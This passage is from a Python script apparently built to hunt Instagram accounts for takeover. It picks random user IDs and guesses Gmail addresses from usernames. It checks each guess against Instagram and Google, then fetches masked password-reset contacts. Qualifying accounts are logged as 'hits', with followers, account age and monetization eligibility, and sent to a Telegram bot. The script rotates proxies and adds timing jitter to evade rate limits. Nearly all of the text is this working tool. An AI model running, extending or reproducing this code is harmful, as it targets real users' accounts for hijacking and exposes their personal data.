        self.token    = token
        self.chat_id  = chat_id
        self._enabled = bool(token and chat_id)
        self._ok      = True
        self._lock    = threading.Lock()
        self._session = requests.Session()

    def send(self, html):
        if not self._enabled:
            return False
        with self._lock:
            if not self._ok:
                return False
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        for attempt in range(2):
            try:
                r = self._session.post(
                    url,
                    json={"chat_id": self.chat_id, "text": html, "parse_mode": "HTML"},
                    timeout=TELEGRAM_TIMEOUT,
                )
                if r.status_code == 200:
                    return True
            except Exception:
                pass
            time.sleep(2 * (attempt + 1))
        with self._lock:
            self._ok = False
        return False

    @staticmethod
    def save(text):
        try:
            with open(HITS_FILE, "a", encoding="utf-8") as f:
                f.write(text + "\n")
        except Exception:
            pass

# ── year ───────────────────────────────────────────────────────────────────
_PK_YEARS = [
    (1, 5000000, 2010), (5000001, 17750000, 2011), (17750001, 279760000, 2012),
    (279760001, 900990000, 2013), (900990001, 1629010000, 2014),
    (1629010001, 2369359761, 2015), (2369359762, 4239516754, 2016),
    (4239516755, 6345108209, 2017), (6345108210, 10016232395, 2018),
    (10016232396, 27238602159, 2019), (27238602160, 43464475395, 2020),
    (43464475395, 50289297647, 2021), (50289297647, 57464707082, 2022),
    (57464707082, 63313426938, 2023), (63313426938, 70134323896, 2024),
    (70134323896, 78313496938, 2025),
]

def pk_to_year(pk):
    try:
        pk = int(pk)
    except (TypeError, ValueError):
        return "2023+"
    for lo, hi, y in _PK_YEARS:
        if lo <= pk <= hi:
            return str(y)
    return "2023+"

def is_eligible(u):
    return u.get("follower_count", 0) >= 50 and not u.get("is_private", True)

def esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def profile_block(p, year, reset, eligible):
    lines = [
        f"{C.PURPLE}╭──────────────────────────────────────────╮{C.RESET}",
        f"{C.PURPLE}│{C.RESET}  {C.WHITE}{BRAND}{C.RESET}  {C.DIM}·{C.RESET}  {C.GREEN}HIT CAPTURED{C.RESET}",
        f"{C.PURPLE}╰──────────────────────────────────────────╯{C.RESET}",
        f"  {C.DIM}name     {C.RESET} {p['full_name'] or '-'}",
        f"  {C.DIM}handle   {C.RESET} {C.WHITE}@{p['username']}{C.RESET}",
        f"  {C.DIM}email    {C.RESET} {C.GREEN}{p['email']}{C.RESET}",
        f"  {C.DIM}followers{C.RESET} {p['follower_count']:,}",
        f"  {C.DIM}following{C.RESET} {p['following_count']:,}",
        f"  {C.DIM}posts    {C.RESET} {p['media_count']}",
        f"  {C.DIM}age      {C.RESET} {year}",
        f"  {C.DIM}bio      {C.RESET} {C.DIM}{(p['biography'] or '-')[:50]}{C.RESET}",
        f"  {C.DIM}reset    {C.RESET} {reset}",
        f"  {C.DIM}monetize {C.RESET} {'✅ eligible' if eligible else '❌ not eligible'}",
        f"  {C.DIM}profile  {C.RESET} {C.CYAN}instagram.com/{p['username']}{C.RESET}",
        f"{C.PURPLE}──────────────────────────────────────────{C.RESET}",
    ]
    return "\n".join(lines)

def telegram_block(p, year, reset, eligible):
    e = esc
    return "\n".join([
        "╭──────────────────────────────────────────╮",
        f"  <b>{BRAND}</b>  ·  <b>HIT CAPTURED</b>",
        "╰──────────────────────────────────────────╯",
        f"  <b>name</b>      {e(p['full_name'] or '-')}",
        f"  <b>handle</b>    @{e(p['username'])}",
        f"  <b>email</b>     {e(p['email'])}",
        f"  <b>followers</b> {p['follower_count']:,}",
        f"  <b>following</b> {p['following_count']:,}",
        f"  <b>posts</b>     {p['media_count']}",
        f"  <b>age</b>       {year}",
        f"  <b>bio</b>       {e((p['biography'] or '-')[:50])}",
        f"  <b>reset</b>     {e(reset)}",
        f"  <b>monetize</b>  {'✅ eligible' if eligible else '❌ not eligible'}",
        "──────────────────────────────────────────",
        f"  <b>profile</b>   <a href='https://instagram.com/{e(p['username'])}'>@{e(p['username'])}</a>",
    ])

# ── worker ─────────────────────────────────────────────────────────────────
def worker(insta, google, reset, reporter):
    while True:
        try:
            STATS.touch()
            uid  = random.randint(USER_ID_MIN, USER_ID_MAX)
            user = insta.get_user_data(uid)
            if not user:
                STATS.incr("null")
                display()
                time.sleep(random.uniform(IG_JITTER_MIN, IG_JITTER_MAX))
                continue
            uname = user.get("username")
            if not uname:
                STATS.incr("null")
                continue
            followers = user.get("follower_count") or 0
            if followers < MIN_FOLLOWERS:
                continue
            email = f"{uname}@gmail.com"

            if not insta.check_email(email):
                STATS.incr("bad")
                display()
                time.sleep(random.uniform(IG_JITTER_MIN, IG_JITTER_MAX))
                continue

            STATS.incr("good")
            display()

            if google.check(email) != "good":
                time.sleep(random.uniform(IG_JITTER_MIN, IG_JITTER_MAX))
                continue

            STATS.incr("hits")
            profile = {
                "username":        uname,
                "email":           email,
                "full_name":       user.get("full_name", "") or "",
                "follower_count":  followers,
                "following_count": user.get("following_count") or 0,
                "media_count":     user.get("media_count") or 0,
                "is_private":      user.get("is_private", False),
                "biography":       user.get("biography", "") or "",
                "pk":              user.get("pk", ""),
            }
            year       = pk_to_year(user.get("pk"))
            reset_mask = reset.fetch(uname)
            eligible   = is_eligible(user)

            emit_hit(profile_block(profile, year, reset_mask, eligible))
            reporter.save(telegram_block(profile, year, reset_mask, eligible))
            reporter.send(telegram_block(profile, year, reset_mask, eligible))
        except Exception as e:
            STATS.incr("err")
            log_error(f"worker: {e!r}\n{traceback.format_exc()}")
            time.sleep(random.uniform(0.05, 0.2))

# ── main ────────────────────────────────────────────────────────────────────
def bootstrap():
    clear_screen()
    print(f"{C.PURPLE}  ┌──────────────────────────────────────────┐{C.RESET}")
    print(f"{C.PURPLE}  │{C.RESET}  {C.WHITE}N U L L V O I D{C.RESET}  {C.DIM}// RDP fast{C.RESET}  {C.PURPLE}│{C.RESET}")
    print(f"{C.PURPLE}  └──────────────────────────────────────────┘{C.RESET}\n")
    try:
        chat_id = input(f"{C.WHITE}Telegram chat ID (blank to skip): {C.RESET}").strip()
        print()
        if chat_id:
            bot_token = input(f"{C.WHITE}Bot token: {C.RESET}").strip()
            print()
        else:
            bot_token = ""
            print(f"{C.DIM}  skipping Telegram{C.RESET}\n")
    except (EOFError, KeyboardInterrupt):
        chat_id, bot_token = "", ""
        print(f"{C.RED}  no stdin — headless{C.RESET}\n")
    return chat_id, bot_token

def main():
    chat_id, bot_token = bootstrap()
    clear_screen()
    print(f"{C.DIM}  {BRAND} · {THREADS_START} threads · RDP · ctrl+c to stop{C.RESET}\n")

    POOL.load()

    google   = GoogleChecker()
    reset    = ResetFetcher()
    reporter = Reporter(bot_token, chat_id)

    threading.Thread(target=status_thread,      daemon=True).start()
    threading.Thread(target=stall_watchdog,     daemon=True).start()
    threading.Thread(target=proxy_refresh_loop, daemon=True).start()

    print(f"{C.DIM}  bootstrapping IG tokens (max 20s)...{C.RESET}")
    ok = False
    for _ in range(20):
        if bootstrap_ig():
            ok = True
            break
        time.sleep(1)
    if ok:
        print(f"{C.GREEN}  IG tokens ready.{C.RESET}\n")
    else:
        print(f"{C.RED}  IG bootstrap failed — workers will retry.{C.RESET}\n")

    insta = InstagramChecker()

    display(force=True)
    if not IS_TTY:
        print(f"{C.DIM}  status also in {STATUS_FILE}{C.RESET}\n")

    stop = threading.Event()

    def _sig(_s, _f):
        stop.set()
        print(f"\n{C.PURPLE}◄  {BRAND} — SESSION ENDED  ►{C.RESET}")
        os._exit(0)

    signal.signal(signal.SIGINT, _sig)
    try:
        signal.signal(signal.SIGTERM, _sig)
    except Exception:
        pass

    with ThreadPoolExecutor(max_workers=THREADS_START) as ex:
        futures = [ex.submit(worker, insta, google, reset, reporter) for _ in range(THREADS_START)]
        try:
            while not stop.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            stop.set()
            for f in futures:
                f.cancel()

if __name__ == "__main__":
    main()